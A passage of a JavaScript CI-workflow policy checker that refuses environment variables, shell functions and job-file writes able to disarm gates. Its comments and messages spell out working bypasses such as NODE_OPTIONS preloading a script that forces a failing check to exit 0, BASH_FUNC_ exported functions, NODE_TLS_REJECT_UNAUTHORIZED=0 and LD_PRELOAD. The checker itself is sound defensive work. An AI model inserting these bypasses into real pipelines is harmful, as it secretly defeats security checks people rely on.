 * allows two entrypoints and `sh` is neither), a protected step refuses it (a
 * launcher nobody put on the allowlist), and on an ordinary step of `verify` or
 * `e2e` it is opaque, as any interpreter's argument is. Closing that means
 * enumerating interpreters, which is the denylist this round exists to stop
 * writing. What this predicate does close is every writer that names the file
 * in an argv it does not quote away: `tee -a "$GITHUB_ENV"`, `dd
 * of="$GITHUB_ENV"`, `sponge "$GITHUB_ENV"` and the next one, in one clause.
 */
function namesJobFile(pattern, { redirections, words }) {
  const names = ({ expandable, value }) => expandable === true && pattern.test(value);
  // A redirection target is the file by construction. An *argument* is the file
  // only if the word is the path and nothing else, or a `key=<path>` operand —
  // which is `dd of="$GITHUB_ENV"` and is not `echo "never write secrets to
  // $GITHUB_ENV"`. The second of those is a sentence, and reading it as a write
  // is a false red a blind review found in the first version of this.
  const isPath = ({ expandable, value }) =>
    expandable === true &&
    /^(?:[A-Za-z_][A-Za-z0-9_.-]*=)?\$(?:\{[^}]*\}|[A-Za-z_][A-Za-z0-9_]*)$/.test(value) &&
    pattern.test(value);
  return (
    (redirections ?? []).some(({ target }) => names(target)) || (words ?? []).slice(1).some(isPath)
  );
}

/**
 * Environment variables that decide what code a protected command runs.
 *
 * ── THE SIXTEENTH BYPASS (#40 round 4, from this round's own blind review) ──
 * Round 4 inverted the node-flag denylist into `NODE_FLAGS_ALLOWED`, so
 * `node --require ./nobble.cjs scripts/ci/assert-x.mjs` reads as *missing*. A
 * blind cross-lineage review of that fix went one step sideways and put the flag
 * in the environment instead. Measured, exactly as written:
 *
 *     $ node /tmp/fake-assert.mjs                                   # exits 1
 *     $ NODE_OPTIONS="--require /tmp/nobble.cjs" node /tmp/fake-assert.mjs
 *     ::error::pretend assertion failed
 *     exit=0
 *
 * where `/tmp/nobble.cjs` is two lines: `process.exit = () => {}` and an `exit`
 * listener setting `process.exitCode = 0`. The annotation still prints. The step
 * goes green. Every gate in this repository is a `node` process, so one
 * `env: NODE_OPTIONS:` on the workflow, the job or the step disarms all of them
 * at once — and all three spellings were clean against the engine as committed
 * an hour earlier.
 *
 * ── THE COMPLETENESS CLAIM THIS TABLE USED TO MAKE, AND WHY IT IS GONE ──────
 * Round 4 justified keeping a *list* here, in a round whose whole lesson was
 * "don't list", with this sentence: "Environment variables that make a program
 * execute code it was not asked to is a documented property of three programs —
 * Node, bash, and the dynamic loader — and each of them publishes its own set.
 * The entries below are that union." It was not the union, and the blind review
 * of round 4 needed three lines to show it:
 *
 *     $ bash -e step.sh                                          # runs node, exits 7
 *     $ env "BASH_FUNC_node%%=() { return 0; }" bash -e step.sh   # exits 0
 *
 * bash imports exported *functions* from the environment, and a function beats
 * the binary in command position — `no-command-shadowing` bans `node() { :; }`
 * written in the script and could not see the same function arriving through
 * `env:`. Two more, both honoured and both clean against the round-4 engine:
 * `NODE_TLS_REJECT_UNAUTHORIZED=0`, which turns off the certificate
 * verification the whole deploy job is conditioned on, and `OPENSSL_CONF`,
 * whose config file can load provider and engine `.so`s — code injection at
 * `LD_PRELOAD`'s level, which was already on the list.
 *
 * A completeness claim about a denylist is itself an overclaim, so the claim is
 * deleted rather than repaired. What replaced it is the polarity that closed
 * every other table in this round: `DECLARED_VARIABLES` below is an
 * **allowlist** of the variable names this workflow sets, and a name that is not
 * on it is refused *whether or not anybody has heard of what it does*.
 * `BASH_FUNC_node%%`, `NODE_TLS_REJECT_UNAUTHORIZED`, `OPENSSL_CONF` and the
 * next runtime's next idea are one clause, not four entries.
 *
 * This table survives underneath that, demoted to what it can honestly be: the
 * *reasons*, for the names somebody is most likely to reach for, so the refusal
 * says why rather than only that. It is explicitly not exhaustive and nothing
 * depends on it being so — every one of these names is refused by the allowlist
 * first, and this only decides which sentence the violation prints.
 *
 * Stated where it will be read: this is the same boundary `no-command-shadowing`
 * has always drawn. It makes the documented injection points loud. It does not
 * prove that the `node` on PATH is Node.
 */
const INJECTING_VARIABLES = {
  PATH: 'PATH decides which binary every command word in this policy resolves to, so prepending a directory redefines every gate at once.',
  NODE_OPTIONS:
    'Node applies NODE_OPTIONS to every `node` process as if the flags had been written on the command line, which is exactly the allowlist in `NODE_FLAGS_ALLOWED` reached through the environment: `NODE_OPTIONS="--require ./nobble.cjs"` loads code into the assertion before its first line and can make a failing gate exit 0 (measured).',
  NODE_PATH:
    "NODE_PATH prepends directories to the CommonJS module search path, so a gate's `require` can be answered by somebody else's file.",
  NODE_REPL_EXTERNAL_MODULE:
    'Node loads the named module in place of its REPL, and it is documented as ignored only when the process is hardened — an injection point by construction.',
  NODE_TLS_REJECT_UNAUTHORIZED:
    'Node reads it as the default for `rejectUnauthorized`, so `NODE_TLS_REJECT_UNAUTHORIZED=0` turns off certificate verification for every TLS client in the process. Measured against a self-signed server: with the variable set and no explicit option, the request returns 200; unset, it fails DEPTH_ZERO_SELF_SIGNED_CERT. The deploy job asserts real TLS through the shipped proxy, so one `env:` line would have made "certificate verification is never disabled" false — see the explicit `rejectUnauthorized: true` in stack-client.mjs, which is what makes that sentence true rather than customary.',
  NODE_EXTRA_CA_CERTS:
    'Node adds the named file to the trusted roots for every TLS client in the process, so a certificate of somebody else’s minting verifies — the same guarantee as NODE_TLS_REJECT_UNAUTHORIZED, undone more quietly.',
  BASH_ENV:
    'bash sources the file named by BASH_ENV before running a non-interactive script, which is every `run:` block in this file.',
  ENV: 'the POSIX equivalent of BASH_ENV, sourced by `sh`.',
  SHELLOPTS:
    'bash applies SHELLOPTS at startup, so it can turn off the `-e` that makes a failing command fail the step.',
  OPENSSL_CONF:
    'OpenSSL reads its configuration from OPENSSL_CONF, and a configuration file can load providers and engines — `.so` files, in-process, chosen by whoever wrote the config. That is LD_PRELOAD-level injection through a file that does not look like code.',
  LD_PRELOAD:
    'the dynamic loader loads the named objects into every process started, ahead of libc — code injection one level below the interpreter.',
  LD_LIBRARY_PATH:
    'the dynamic loader searches it first, so a shared object of somebody else’s choosing answers for a real one.',
};

/**
 * `BASH_FUNC_node%%` is not a name, it is a family.
 *
 * bash exports a shell function as an environment variable called
 * `BASH_FUNC_<name>%%`, and imports every such variable at startup. The name in
 * the middle is the function being defined, so no fixed key can name them: the
 * prefix is the entry. Measured, exactly as written above — `env
 * "BASH_FUNC_node%%=() { return 0; }" bash -e step.sh` exits 0 where the same
 * script exits 7 without it.
 */
const EXPORTED_FUNCTION_PREFIX = 'BASH_FUNC_';

/** Why this variable is an injection point, or undefined if nobody has said. */
function injectionReason(name) {
  if (Object.hasOwn(INJECTING_VARIABLES, name)) return INJECTING_VARIABLES[name];
  if (name.startsWith(EXPORTED_FUNCTION_PREFIX)) {
    return `bash imports exported shell functions from the environment, and \`${name}\` is how one is spelled: it defines \`${name.slice(EXPORTED_FUNCTION_PREFIX.length).replace(/%%$/, '')}\` as a function for every \`run:\` block in the job, and a function beats the binary in command position. It is the \`node() { :; }\` this rule already refuses, arriving where the script cannot be read for it — measured: \`env "BASH_FUNC_node%%=() { return 0; }" bash -e step.sh\` exits 0 where \`bash -e step.sh\` exits 7.`;
  }
  return undefined;
}

/**
 * Every environment variable name this workflow is allowed to set, anywhere.
 *
 * ── WHY AN ALLOWLIST (#40 round 5) ──────────────────────────────────────────
 * See the block above `INJECTING_VARIABLES`: a denylist of injecting variables
 * cannot be complete, and round 4 claimed one was. This is the same inversion
 * the launcher table, the node-flag table, the deploy entrypoints and the
 * manager table have each had in turn, and it is cheap here because the set is
 * genuinely small — fourteen names, every one of them derived from what the
 * workflow actually does.
 *
 * The reason beside each is the same standard the launcher table asks for: a
 * variable is here because some program in this repository reads it, not
 * because it looked harmless. Nothing on this list names or locates code.
 *
 * The cost is stated rather than discovered: adding an environment variable to
 * this workflow is now an edit to this file. That is the intended price. Every
 * bypass in this ticket's sixteen rounds arrived as something nobody had
 * enumerated, and the only enumeration that survives that is the one that says
 * what is allowed.
 */
export const DECLARED_VARIABLES = {
  NODE_VERSION: 'the Node version the workflow installs and the jobs interpolate into a step name.',
  ACTIONLINT_VERSION: 'the actionlint release the lint job downloads.',
  ACTIONLINT_SHA256: 'the checksum that download is verified against.',
  DATABASE_URL: 'the connection string the `verify` job’s migrations and suite use.',
  POSTGRES_USER: 'the service container’s own credentials, read by Postgres at startup.',
  POSTGRES_PASSWORD: 'the same.',
  POSTGRES_DB: 'the same.',
  PLAYWRIGHT_JSON_OUTPUT_NAME: 'where Playwright writes the report the e2e gate reads.',
  NEEDS: 'the `toJSON(needs)` payload the gate job inspects.',
  ATRIUM_COMPOSE_PROJECT: 'the compose project name every stage of the deploy job shares.',
  ATRIUM_COMPOSE_FILES:
    'THE compose file list, declared once on the deploy job — see `compose-through-one-entrypoint`.',
  ATRIUM_STACK_DOMAIN: 'the hostname the deployment serves and the assertions ask for.',
  ATRIUM_STACK_CA: 'the path the certificate authority is copied to and verified against.',
  ATRIUM_IMAGE_MANIFEST: 'where this run records the image IDs it built.',
  VITEST_RUN_START:
    'the millisecond the unit suite started, written to `$GITHUB_ENV` so the report gate can refuse a stale report.',
  E2E_RUN_START: 'the same, for the Playwright suite.',
  GIT_TERMINAL_PROMPT:
    'git’s own "never ask for credentials" switch. Not set by the workflow today; it is here because an ACCEPTED_FORMS fixture writes it in front of the baseline fetch, and a fixture that the policy refuses is a fixture that proves nothing.',
};

/**
 * Why this variable name may not be set here, or undefined if it may.
 *
 * One sentence either way, never two: a name that is both undeclared and a
 * known injection point gets the sentence that says what it does, because "each
 * mutation fires exactly its own rule, once" is what makes the self-test's
 * purity check mean anything. Every caller below prints it after its own
 * description of *where* the name was set, so the two halves — what was done
 * and why it is refused — stay in the voice each site already had.
 */
function variableProblem(name) {
  const reason = injectionReason(name);
  if (reason !== undefined) return reason;
  if (Object.hasOwn(DECLARED_VARIABLES, name)) return undefined;
  return `\`${name}\` is not one of the environment variables this workflow declares (${Object.keys(
    DECLARED_VARIABLES,
  )
    .map((word) => `\`${word}\``)
    .join(
      ', ',
    )}). This is an allowlist because the denylist it replaces claimed to be "the union" of the variables that make a program run code it was not asked to, and was not: \`BASH_FUNC_node%%\` defines a shell function that beats the binary, \`NODE_TLS_REJECT_UNAUTHORIZED=0\` turns off the certificate verification this workflow's deploy job is conditioned on, and \`OPENSSL_CONF\` can load a provider \`.so\` — all three were clean against the previous version. To add a variable, put it here with the sentence saying which program in this repository reads it.`;
}

/**
 * Obvious redefinitions of a protected command word.
 *
 * ── WHAT THIS DOES AND DOES NOT PROVE ───────────────────────────────────────
 * Every rule in this file recognises a command by its *word*. `git fetch …` in
 * command position is a genuine invocation of whatever `git` resolves to, and a
 * shell function or a PATH entry can make that anything:
 *
 *     git() { :; }                        # the fetch runs, and does nothing
 *     export PATH="$PWD/fake:$PATH"       # so does this
 *
 * Both are banned here, along with `alias git=…`, `hash -p`, and writes to
 * `$GITHUB_PATH` (which prepends to PATH for every later step in the job).
 * That is a list of spellings, and a list of spellings is not a proof. Executable
 * *provenance* — that the `git` this step runs is the git the runner image
 * shipped — cannot be established by reading the workflow, because anything that
 * would check it also runs from the revision under test. It is owned by the
 * governance trigger in the README, and this rule exists to make the obvious
 * forms loud rather than to claim the class is closed.
 */
function checkCommandShadowing(script, where, add, path) {
  const { commands, functions } = parseScript(script);
  const protectedWord = (name) => PROTECTED_COMMANDS.includes(basename(name));

  for (const name of functions) {
    if (protectedWord(name)) {
      add(
        'no-command-shadowing',
        `${path}: the script at ${where} defines a shell function \`${name}()\`, which is one of the command words this policy recognises. Every presence rule here reads a command by its name, so redefining that name turns a gate that is present, named and invoked into a gate that does nothing.`,
      );
    }
  }

  for (const { raw, argv, assignments, redirections, via, words } of commands) {
    // `env PATH=/tmp/fake node …` survives `unwrap()` — the launcher's own
    // assignments are not the shell's, so the loop below never saw them. Round
    // 3's gauntlet filed it as polish, and it is the same rule: the protected
    // word stops meaning the runner's binary. On a *protected* step `env` is
    // refused outright by the launcher allowlist; this covers every other step.
    for (const assignment of via?.flatMap(({ name, assignments: words }) =>
      name === 'env' ? words : [],
    ) ?? []) {
      const name = assignment.split('=')[0];
      const problem = variableProblem(name);
      if (problem !== undefined) {
        add(
          'no-command-shadowing',
          `${path}: the script at ${where} runs \`env ${name}=…\`. That is an assignment the shell never sees — it is an argument to \`env\` — and ${problem}`,
        );
      }
    }
    for (const { name } of assignments) {
      const problem = variableProblem(name);
      if (problem !== undefined) {
        add(
          'no-command-shadowing',
          `${path}: the script at ${where} assigns \`${name}\` for one command. ${problem}`,
        );
      }
    }
    if (SHADOWING_BUILTINS.has(raw[0])) {
      for (const word of raw.slice(1)) {
        const name = word.split('=')[0];
        const problem = word.includes('=') ? variableProblem(name) : undefined;
        if (problem !== undefined) {
          add(
            'no-command-shadowing',
            `${path}: the script at ${where} runs \`${raw[0]} ${name}=…\`. ${problem}`,
          );
        }
        if (raw[0] === 'alias' && protectedWord(word.split('=')[0])) {
          add(
            'no-command-shadowing',
            `${path}: the script at ${where} aliases \`${word.split('=')[0]}\`, which is one of the command words this policy recognises.`,
          );
        }
      }
    }
    // ── THE NAME AS DATA (#40 round 5, third pass) ───────────────────────────
    // `${!NAME}` is bash's indirect expansion: it expands to the value of the
    // variable *named by* NAME. Every rule in this file recognises a variable
    // by its name, so a construct that computes the name defeats all of them at
    // once. Measured, and found by a blind review of this round's own fix:
    //
    //     env:
    //       GIT_TERMINAL_PROMPT: GITHUB_ENV
    //     run: echo "NODE_OPTIONS=--require /tmp/nobble.cjs" >> "${!GIT_TERMINAL_PROMPT}"
    //
    // writes the real `$GITHUB_ENV`, and every name in it is on
    // `DECLARED_VARIABLES` — the allowlist supplied the indirection itself.
    // Policy: completely clean.
    //
    // There is no version of `namesJobFile` that can see through this, because
    // the name is not in the text. So the construct is refused: nothing in this
    // workflow needs it, and a rule that reads names cannot be asked to read a
    // name that is not written down.
    for (const value of [
      ...words.map((word) => word.value),
      ...redirections.map(({ target }) => target.value),
    ]) {
      if (/\$\{!/.test(value)) {
        add(
          'no-command-shadowing',
          `${path}: the script at ${where} uses bash indirect expansion (\`\${!…}\`) in \`${value}\`. That expands to the value of the variable *named by* another variable, so the name this policy would read is not in the text: \`env: {GIT_TERMINAL_PROMPT: GITHUB_ENV}\` with \`>> "\${!GIT_TERMINAL_PROMPT}"\` writes the job environment with every name in it on the allowlist. Write the variable you mean.`,
        );
      }
    }
    if (argv[0] === 'hash' && raw.includes('-p')) {
      add(
        'no-command-shadowing',
        `${path}: the script at ${where} runs \`hash -p\`, which points a command word at a path of its own choosing.`,
      );
    }
    // `echo "$PWD/fake" >> "$GITHUB_PATH"` prepends to PATH for every later step
    // in the job — the same shadowing, spelled as a file write.
    if (namesJobFile(GITHUB_PATH_FILE, { redirections, words })) {
      add(
        'no-command-shadowing',
        `${path}: the script at ${where} writes to \`$GITHUB_PATH\`, which prepends a directory to PATH for every later step in the job. Invoke the binary by its full path instead.`,
      );
    }
    // `echo "NODE_OPTIONS=--require ./nobble.cjs" >> "$GITHUB_ENV"` is the same
    // thing for the variables above, and this workflow legitimately writes to
    // `$GITHUB_ENV` (the run-start timestamps), so the *payload* decides rather
    // than the destination.
    //
    // ── FOUND BY ATTACKING THIS ROUND'S OWN ALLOWLIST ────────────────────────
    // Reading the *words* of the command is not enough, and the hole is one
    // line wide. A here-document body is data to this parser (deliberately —
    // see `skipHeredocBodies`), so
    //
    //     cat >> "$GITHUB_ENV" <<'EOF'
    //     NODE_OPTIONS=--require ./nobble.cjs
    //     EOF
    //
    // is a `cat` with no words at all, and every gate in the job is disarmed
    // from the next step onwards. Only *protected* steps are refused an
    // unquoted heredoc; a quoted one on any ordinary step of `verify` or `e2e`
    // was clean. So the shape is what is checked, in the polarity this round
    // has applied everywhere else: a command writing to the job's environment
    // must be one of two commands, and must say — in a literal word this engine
    // can read — which variable it is setting.
    //
    // Two commands rather than a payload test, because a payload test is
    // another thing the writer chooses. The first version of this checked only
    // "is the first operand shaped like an assignment", and `dd
    // of="$GITHUB_ENV" oflag=append conv=notrunc` satisfies it three times over
    // while writing the job environment from a pipe — the refusal fired, and it
    // fired saying "writes `of=…`", which is a rule describing the wrong thing.
    // `echo` and `printf` are the two whose first operand *is* the line that
    // lands in the file. Everything else — `cat`, `dd`, `tee`, `sponge`, and
    // whichever one is next — is refused without this engine having heard of it.
    if (namesJobFile(GITHUB_ENV_FILE, { redirections, words })) {
      const assignmentShaped = (word) => /^[A-Za-z_][A-Za-z0-9_]*\+?=/.test(word);
      const payload = firstOperand(argv);
      const writer = argv[0];
      const sayable = writer === 'echo' || writer === 'printf';
      if (!sayable || payload === undefined || !assignmentShaped(payload)) {
        add(
          'no-command-shadowing',
          `${path}: the script at ${where} writes to \`$GITHUB_ENV\` — which sets variables for every later step in the job — without a literal \`NAME=\` this policy can read. ${
            sayable
              ? `Its first operand is \`${payload ?? '(none)'}\`, and a command substitution is opaque to this parser, so \`echo "$(…)" >> "$GITHUB_ENV"\` sets a variable nothing here can name.`
              : `\`${writer}\` is not one of the two commands that may write the job environment (\`echo\`, \`printf\`), whose first operand *is* the line that lands in the file. \`cat >> "$GITHUB_ENV" <<'EOF'\` writes a here-document body, which is data to this parser; \`dd of="$GITHUB_ENV"\` and \`tee -a "$GITHUB_ENV"\` write a pipe. None of the three says which variable it is setting.`
          } Write it as \`echo NAME=value >> "$GITHUB_ENV"\` with \`NAME\` declared in DECLARED_VARIABLES, or do not write to the job environment.`,
        );
        continue;
      }
      for (const word of raw) {
        const name = word.split('=')[0].trim();
        // A word is an assignment only if it is *shaped* like one. `--foo=bar`
        // contains an `=` and names no variable, and an allowlist that read it
        // as one would be a false red on the first ordinary flag.
        if (!assignmentShaped(word)) continue;
        const problem = variableProblem(name);
        if (problem !== undefined) {
          add(
            'no-command-shadowing',
            `${path}: the script at ${where} writes \`${name}=…\` to \`$GITHUB_ENV\`, which sets it for every later step in the job. ${problem}`,
          );
        }
      }
    }
  }
}

/**
 * A protected step is one command, and it always runs.
 *
 * ── THE DEFECT (#40 round 2, shared with #28) ───────────────────────────────
 * Six rounds of hardening asked whether a protected script was *invoked*, and
 * the parser answered correctly. `false && node scripts/ci/assert-page-serves.mjs;
 * true` satisfies that question exactly: `node` is in command position, it is
 * not backgrounded, it completes. The assertion never runs, the step exits 0,
 * and — because the mutation ledger recovered the script name by regular
 * expression and ran it itself — the ledger went on certifying that the
 * assertion caught its mutation. Both halves of the verification stack agreed on
 * something false, which is the worst available outcome.
 *
 * Recognition cannot fix this, and a seventh matcher would not either:
 * `false && x` and `true && x` parse identically and nothing here evaluates a
 * shell. So the answer is to refuse the *shape* where it matters. A protected
 * step is a step whose whole purpose is to fail; if it can be written so that it
 * does not run, the guard is decoration. Canonical means: exactly one simple
 * command, no control operators, no reserved words, no subshell, not
 * backgrounded. Launchers, one-shot assignments, redirections and backslash
 * continuations all still pass, because none of them decides whether the command
 * runs.
 *
 * ── WHICH STEPS ─────────────────────────────────────────────────────────────
 *  - any step, in any job, that runs a command some rule in REQUIRED_STEPS
 *    depends on. Those are precisely the commands whose failure is the point.
 *  - *every* `run:` step of the `deploy` job, protected or not. That job is the
 *    pipeline `deploy-mutation-ledger.mjs` re-executes command for command; a
 *    step the ledger cannot run verbatim is a step it has to model, and a model
 *    is where the two descriptions drift apart.
 *
 * ── WHAT IT COSTS ───────────────────────────────────────────────────────────
 * Four forms that round 6 deliberately *accepted* — a subshell, a `&&` list, a
 * pipeline into `xargs`, and a shell function defined then called — are now
 * refused on a protected step. Round 6 was right that all four are honest
 * invocations and that a matcher which cannot see them is wrong; they are still
 * recognised. They are refused here for a different reason, and the two live
 * side by side in `workflow-policy-selftest.mjs`: recognition asks *is this a
 * command*, this asks *does it always run*.
 */
/**
 * Which steps the shape rule owns, as `jobId → Set<index>`.
 *
 * Derived once and shared with `checkManagerSelection`, so the two rules cannot
 * disagree about who is responsible for a step. Two rules that both fire on one
 * edit break the self-test's purity check; two that both decline to fire are a
 * hole, and a hole that opens the day the definition of "protected" changes in
 * one of two places is the kind nobody notices.
 */
function protectedStepIndices(jobs) {
  const owned = new Map();
  for (const [jobId, required] of Object.entries(REQUIRED_STEPS)) {
    const job = jobs[jobId];
    if (!isPlainObject(job)) continue;
    const matchers = new Set();
    for (const step of required) {
      matchers.add(step.test);
      for (const prerequisite of step.requires ?? []) matchers.add(prerequisite.test);
    }
    const indices = new Map();
    const steps = Array.isArray(job.steps) ? job.steps : [];
    for (const [index, step] of steps.entries()) {
      if (!isPlainObject(step) || typeof step.run !== 'string') continue;
      const protects = [...matchers].filter((matcher) => matcher.test(step.run));
      if (protects.length > 0 || jobId === DEPLOY_JOB) indices.set(index, protects);
    }
    owned.set(jobId, indices);
  }
  return owned;
}

function checkProtectedStepShape(jobs, path, add) {
  for (const [jobId, indices] of protectedStepIndices(jobs)) {
    const steps = Array.isArray(jobs[jobId]?.steps) ? jobs[jobId].steps : [];
    for (const [index, protects] of indices) {
      const problems = singleCommandProblems(steps[index].run);
      if (problems.length === 0) continue;
      const because =
        protects.length > 0
          ? `it runs ${protects.map(String).join(' and ')}, which this policy requires to be present`
          : 'every step of the `deploy` job is a stage the mutation ledger re-executes verbatim';
      add(
        'protected-steps-run-one-command',
        `${path}: jobs.${jobId}.steps.${index}.run is a protected step — ${because} — but ${problems.join('; and ')}. A protected step must be one unconditional command: \`false && node scripts/ci/assert-x.mjs; true\` satisfies every presence rule here, skips the assertion, and exits green. Split it into separate steps, or move the extra work into the script.`,
      );
    }
  }
}

/**
 * Every step's package-manager options, not only the protected ones.
 *
 * ── THE META-DEFECT, COMMITTED BY THE COMMIT THAT NAMED IT (#40 round 5) ────
 * The manager table's new rule — a `--filter` that can select nothing is a
 * command that can fail to run, so it is admissible only with
 * `--fail-if-no-match` — is a statement about how this workflow invokes pnpm.
 * It was enforced through `singleCommandProblems`, which the engine asks only
 * of protected steps and of the deploy job. Both blind reviews of the fix found
 * the same consequence:
 *
 *     run: pnpm --filter @atrium/does-not-exist install --frozen-lockfile
 *
 * exits 0 having installed nothing, and the policy called it clean. That is the
 * rule applied at fewer sites than its own words cover, which is the one thing
 * this round exists to stop doing.
 *
 * So the manager half runs over every `run:` step of every job. The launcher
 * half deliberately does not: refusing `xargs` or `setsid` on an ordinary step
 * would be a new prohibition with no defect behind it, while a package manager
 * that selects nothing is the same silent success wherever it is written.
 *
 * Steps the shape rule already owns are skipped, so one edit fires one rule —
 * the purity the self-test checks.
 */
function checkManagerSelection(jobs, path, add) {
  const owned = protectedStepIndices(jobs);
  for (const [jobId, job] of Object.entries(jobs)) {
    if (!isPlainObject(job)) continue;
    const steps = Array.isArray(job.steps) ? job.steps : [];
    for (const [index, step] of steps.entries()) {
      if (!isPlainObject(step) || typeof step.run !== 'string') continue;
      if (owned.get(jobId)?.has(index)) continue;
      for (const command of parseScript(step.run).commands) {
        for (const problem of managerProblems(command)) {
          add(
            'package-managers-select-something',
            `${path}: jobs.${jobId}.steps.${index}.run ${problem}. This is not a protected step, and the rule applies anyway: a package manager whose selection can be empty reports success with nothing having run, wherever it is written — \`pnpm --filter @atrium/does-not-exist install --frozen-lockfile\` exits 0 and installs nothing.`,
          );
        }
      }
    }
  }
}

/**
 * The deploy job resolves its compose file list exactly once.
 *
 * ── THE DEFECT (#40 round 2) ────────────────────────────────────────────────
 * "Preflight may not inspect the configuration that is deployed. Preflight
 * resolves `ATRIUM_COMPOSE_FILES`; build/up/cp/down hard-code the two base
 * files. An extra 'safe' overlay lets preflight see `gateway_mode=nat` while the
 * real `up` uses a routed base network."
 *
 * Two expressions of one list is two chances to disagree, and neither half could
 * see the other. So there is one: `scripts/ci/compose-stack.mjs`, which asks
 * `composeArgs` — the same function every assertion in the job uses. This rule
 * is what keeps it one: a bare `docker compose` in this job is refused outright,
 * because the moment a second `-f` list exists nothing in this file can prove it
 * matches the first.
 *
 * The environment variable itself must be declared on the job, and **only** on
 * the job. Without it `composeArgs` falls back to `docker-compose.yml` alone —
 * the mailpit overlay silently gone, which is a stack with no relay and a mail
 * assertion waiting for a message nobody could have sent. And re-declared on a
 * *step*, it is the original defect with a different spelling: a blind
 * cross-lineage review of the first version of this rule pointed out that
 *
 *     - run: node scripts/ci/assert-deploy-preflight.mjs
 *     - run: ATRIUM_COMPOSE_FILES=docker-compose.yml node scripts/ci/compose-stack.mjs up
 *
 * passed it, and that is exactly "the preflight sees one stack and the boot
 * brings up another". So the variable may be set in one place, and a step that
 * re-points it — by `env:` or by a one-shot assignment — is refused.
 *
 * Two more spellings from the same review: `docker-compose` (the v1 binary) is a
 * compose invocation this rule used to read as an unrelated command, and
 * `sh -c '…'` hides an entire script from an engine that parses `run:`. Neither
 * has any business in this job, so both are refused by name.
 *
 * ── ROUND 4: BY NAME WAS THE PROBLEM ────────────────────────────────────────
 * The round-3 gauntlet: "`compose-through-one-entrypoint` is a closed list of
 * binaries. Standalone `compose`, `podman compose`, and `node -e` with an inline
 * `execFileSync("docker", ["compose", …])` all pass — the same shape as `sh -c`
 * before it was banned by name." All three reproduced. It is the launcher
 * denylist again in a second file: an enumeration of ways to reach a container
 * runtime is unbounded, and the runtime does not have to be called `docker`.
 *
 * So this is an allowlist too, and a much shorter one, because the deploy job
 * genuinely only does two things. Every `run:` step of `deploy` must be either
 *
 *   - `node scripts/ci/<name>.mjs [args]`, the one file family that resolves its
 *     compose file list from `ATRIUM_COMPOSE_FILES` through `composeArgs()`, or
 *   - the `cat > .env` heredoc that writes the deployment environment.
 *
 * and anything else is refused *without this file having heard of it*. `compose
 * up`, `podman compose up`, `nerdctl compose`, `docker`, `sh -c`, `curl … |
 * sh`, `node -e "require('child_process').execFileSync('docker', …)"` and the
 * next container CLI are one clause, not five.
 *
 * `DEPLOY_ENTRYPOINTS` is exported and `deploy-mutation-ledger.mjs` classifies
 * its stages with it, so "what the policy permits in this job" and "what the
 * ledger knows how to run" are one list rather than two that agree today.
 */
const COMPOSE_VARIABLES = ['ATRIUM_COMPOSE_FILES', 'ATRIUM_COMPOSE_PROJECT'];

/** `scripts/ci/<name>.mjs`, however many `../` the step's directory needs. */
export const CI_SCRIPT_PATH = /^(?:\.\.\/)*scripts\/ci\/([a-z0-9-]+)\.mjs$/;

/**
 * The two command shapes the deploy job may run, as predicates over one parsed
 * command. Anything else is refused.
 *
 * `runsItsScript` is part of the first one deliberately: `node --check
 * scripts/ci/assert-page-serves.mjs` matches the path and executes nothing, and
 * an entrypoint allowlist that accepted it would re-open the round-3 bypass at
 * the level below the shell.
 */
/**
 * The actions the deploy job may `uses:`.
 *
 * Found by attacking the entrypoint allowlist rather than by a reviewer, and it
 * is the same hole one level out: the allowlist governs `run:` scripts, and a
 * `uses:` step is a program too. An action can call `core.exportVariable` — the
 * supported way to write `$GITHUB_ENV` — and set `NODE_OPTIONS` for every later
 * step in the job, which is the sixteenth bypass reached through a dependency
 * instead of through YAML. `pin-actions-to-sha` requires a commit SHA and says
 * nothing about whose commit.
 *
 * So this job may use two actions: a checkout and a Node install. Both are what
 * the runner needs before any of this repository's own code exists, and neither
 * is something a `scripts/ci/*.mjs` file could do instead. Anything else — a
 * cache, a docker login, a "setup" action for some tool — is refused, and the
 * refusal does not have to have heard of it.
 *
 * Compared without the `@<sha>`: the SHA is `pin-actions-to-sha`'s business and
 * a version bump must not be an edit to this list.
 */
export const DEPLOY_ACTIONS = ['actions/checkout', 'actions/setup-node'];

export const DEPLOY_ENTRYPOINTS = [
  {
    id: 'ci-script',
    describe: '`node scripts/ci/<name>.mjs [args]`',
    /** @returns {string|null} the script's bare name */
    match: ({ argv, via }) => {
      if (argv[0] !== 'node' || !runsItsScript(argv)) return null;
      // No package manager may sit in front of it. `timeout 5 pnpm
      // --fail-if-no-match --filter @atrium/nope exec node
      // scripts/ci/assert-page-serves.mjs` unwraps to argv[0] === 'node' and
      // was accepted here — found by probing this round's own manager fix. The
      // job's own comment says why it must not be: "No pnpm here: every script
      // this job runs is dependency-free by design, so the assertions cannot be
      // broken by an install that resolved differently from the one inside the
      // images." A comment is not a control; this is.
      const manager = (via ?? []).find(({ kind }) => kind === 'manager');
      if (manager !== undefined) return null;
      const operand = firstOperand(argv);
      const found = operand === undefined ? null : CI_SCRIPT_PATH.exec(operand);
      return found ? found[1] : null;
    },
  },
  {
    id: 'env-file',
    describe: '`cat > .env <<…`, the deployment environment heredoc',
    match: ({ argv, redirections }) =>
      argv[0] === 'cat' &&
      redirections.some(({ op, target }) => (op === '>' || op === '>>') && target.value === '.env')
        ? '.env'
        : null,
  },
];

/**
 * Which deploy entrypoint this command is, or null.
 *
 * @param {object} command one entry of `parseScript(step.run).commands`
 * @returns {{entrypoint: object, name: string}|null}
 */
export function deployEntrypoint(command) {
  for (const entrypoint of DEPLOY_ENTRYPOINTS) {
    const name = entrypoint.match(command);
    if (name !== null) return { entrypoint, name };
  }
  return null;
}

function checkComposeEntrypoint(jobs, path, add) {
  const job = jobs[DEPLOY_JOB];
  if (!isPlainObject(job)) return;
  const files = isPlainObject(job.env) ? job.env.ATRIUM_COMPOSE_FILES : undefined;
  if (typeof files !== 'string' || files.trim() === '') {
    add(
      'compose-through-one-entrypoint',
      `${path}: job \`${DEPLOY_JOB}\` does not declare \`ATRIUM_COMPOSE_FILES\` in its \`env:\`. Every compose invocation in this job — the verbs and the assertions alike — resolves its file list from that variable, and unset it means \`docker-compose.yml\` alone: no mail catcher, and a mail assertion waiting for a message nothing could have sent.`,
    );
  }
  const steps = Array.isArray(job.steps) ? job.steps : [];
  for (const [index, step] of steps.entries()) {
    if (!isPlainObject(step)) continue;
    for (const variable of COMPOSE_VARIABLES) {
      if (isPlainObject(step.env) && Object.hasOwn(step.env, variable)) {
        add(
          'compose-through-one-entrypoint',
